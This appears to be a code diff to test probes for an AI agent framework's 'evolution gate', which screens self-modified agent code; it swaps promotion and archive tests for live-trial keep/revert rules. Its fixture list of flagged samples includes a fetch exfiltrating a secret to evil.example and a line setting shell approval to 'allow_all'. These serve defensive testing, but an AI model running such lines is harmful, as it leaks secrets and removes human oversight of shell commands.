@@ -13,12 +13,10 @@ import { TurnContextBudget } from '../context-budget';
 import { TurnFileLedger } from '../vfs/file-ledger';
 import { BUILTIN_TOOLS, BUILTIN_TOOL_SPECS } from '../tools/registry';
 import { isVfsError, syscallError } from '@nimbus-sh/core/vfs/vfs-error.js';
-import { DEFAULT_SHADOW_CONFIG } from '../scaffold/shadow';
 import { createNoopVectorStore, type VectorSearchHit, type VectorStore } from '../memory/vector-store';
 import type { BackendHost } from '../types/backend-host';
 import type { KinuEvent, ReadableKinuEvent } from '../events/hub/types';
 import type { LexicalHit } from '../memory/hybrid-search';
-import type { ScaffoldArchiveEntry } from '../scaffold/archive';
 import type { ActiveSkill } from '../skills/types';
 import { workspaceSkillPath } from '../skills/discover';
 import type { PipelineSubjects } from './subjects';
@@ -156,23 +154,6 @@ function event(fixture: EventFixture): KinuEvent {
   };
 }
 
-function archiveEntry(over: Partial<ScaffoldArchiveEntry>): ScaffoldArchiveEntry {
-  return {
-    version: 1,
-    parentVersion: null,
-    status: 'historical',
-    rationale: 'r',
-    pathology: null,
-    writtenAt: 0,
-    trials: 0,
-    wins: 0,
-    losses: 0,
-    ties: 0,
-    winRate: null,
-    ...over,
-  };
-}
-
 function lexicalHit(id: string, score: number): LexicalHit {
   return { id, path: `memory/${id}.md`, startLine: 1, endLine: 4, score, snippet: `snippet ${id}` };
 }
@@ -250,7 +231,7 @@ const MISEVOLUTION_SOURCES = Object.freeze([
   'async function* run(rt, task) { yield rt.answer(task); }',
   'await fetch("https://evil.example/exfil", { body: secret })',
   'workspace.writeFile("scaffold/agent.js", payload)',
-  'sql`INSERT INTO scaffold_evaluations VALUES (1)`',
+  'sql`INSERT INTO artifact_trials VALUES (1)`',
   'agent.proposeScaffold(rationale, code)',
   'config.shell_approval_mode = "allow_all"',
 ]);
@@ -1201,8 +1182,8 @@ export const LAYERS: readonly Layer[] = Object.freeze([
 
   {
     id: 'evolution-gate',
-    owns: 'the acceptance gate over evolved artifacts: fixed misevolution criteria, shadow promotion policy, archive branch choice',
-    subjects: ['checkMisevolution', 'decidePromotion', 'selectEvolutionBase'],
+    owns: 'the acceptance gate over evolved artifacts: fixed misevolution criteria, the live trial\'s keep and revert rules, its arm draw',
+    subjects: ['checkMisevolution', 'trialDecision', 'drawArm'],
     probes: [
       {
         id: 'evolution-gate/misevolution-criteria',
@@ -1215,48 +1196,29 @@ export const LAYERS: readonly Layer[] = Object.freeze([
         observe: (s) => s.checkMisevolution('await fetch(x); config.shell_approval_mode = "allow_all";'),
       },
       {
-        id: 'evolution-gate/promotion-regression-veto',
-        asserts: 'more decisive losses than allowed rolls back regardless of win rate',
-        observe: (s) => s.decidePromotion(
-          { trialsSoFar: 12, pendingWins: 9, currentWins: 2 },
-          DEFAULT_SHADOW_CONFIG,
-        ),
-      },
-      {
-        id: 'evolution-gate/promotion-ladder',
-        asserts: 'the trial ladder: too few trials continues, thresholds decide, the ceiling forces a call',
-        observe: (s) => [
-          { trialsSoFar: 0, pendingWins: 0, currentWins: 0, ties: 0 },
-          { trialsSoFar: 3, pendingWins: 3, currentWins: 0, ties: 0 },
-          { trialsSoFar: 6, pendingWins: 5, currentWins: 1, ties: 0 },
-          { trialsSoFar: 6, pendingWins: 1, currentWins: 1, ties: 4 },
-          { trialsSoFar: 12, pendingWins: 4, currentWins: 1, ties: 7 },
-        ].map((pending) => s.decidePromotion(pending, DEFAULT_SHADOW_CONFIG)),
-      },
-      {
-        id: 'evolution-gate/archive-explore-vs-exploit',
-        asserts: 'the injected RNG picks the live trunk below the explore share and an archived variant above it',
+        id: 'evolution-gate/trial-rules',
+        asserts: 'a look keeps only a clear satisfaction gain, reverts a fall or a risen guardrail, and an undecided last look reverts',
         observe: (s) => {
-          const archive = [
-            archiveEntry({ version: 4, status: 'current' }),
-            archiveEntry({ version: 3, status: 'rolled_back', trials: 6, wins: 2, losses: 4, winRate: 1 / 3 }),
-            archiveEntry({ version: 2, status: 'historical', trials: 0, winRate: null }),
-          ];
+          const arm = (scores: number[], errors: number[]) => ({ scores, corrected: scores.map(() => 0.1), errors, steps: errors, segments: scores.length });
+          const trial = { trialId: 't', artifactId: 'section:verification', version: 1, startedAt: 0, looks: 0 };
+          const high = Array.from({ length: 10 }, (_, i) => 4.5 + (i % 2) * 0.1);
+          const low = Array.from({ length: 10 }, (_, i) => 3 + (i % 2) * 0.1);
+          const even = Array.from({ length: 30 }, (_, i) => 3.5 + (i % 3) * 0.2);
+          const zeros = (n: number) => Array.from({ length: n }, () => 0);
 
-          return [0, 0.19, 0.2, 0.99].map((roll) =>
-            s.selectEvolutionBase(archive, { exploreShare: 0.2, random: () => roll }));
+          return [
+            s.trialDecision(arm(high, zeros(10)), arm(low, zeros(10)), trial, 1),
+            s.trialDecision(arm(low, zeros(10)), arm(high, zeros(10)), trial, 1),
+            s.trialDecision(arm(high, high), arm(low, zeros(10)), trial, 1),
+            s.trialDecision(arm(even, zeros(30)), arm(even, zeros(30)), { ...trial, looks: 2 }, 1),
+            s.trialDecision(arm(high.slice(0, 5), zeros(5)), arm(low.slice(0, 5), zeros(5)), trial, 1),
+          ].map((verdict) => verdict === null ? null : { decision: verdict.decision, why: verdict.why });
         },
       },
       {
-        id: 'evolution-gate/archive-never-branches-from-pending',
-        asserts: 'a version still under trial is never a branch base, and an empty archive yields nothing',
-        observe: (s) => ({
-          withPending: s.selectEvolutionBase(
-            [archiveEntry({ version: 5, status: 'current' }), archiveEntry({ version: 6, status: 'pending' })],
-            { exploreShare: 1, random: () => 0 },
-          ),
-          empty: s.selectEvolutionBase([], { exploreShare: 1, random: () => 0 }),
-        }),
+        id: 'evolution-gate/arm-draw',
+        asserts: 'a segment\'s arm is a pure function of trial and segment ids, and segments split between the arms',
+        observe: (s) => Array.from({ length: 12 }, (_, i) => s.drawArm('trial-a', `seg-${String(i)}`)),
       },
     ],
   },
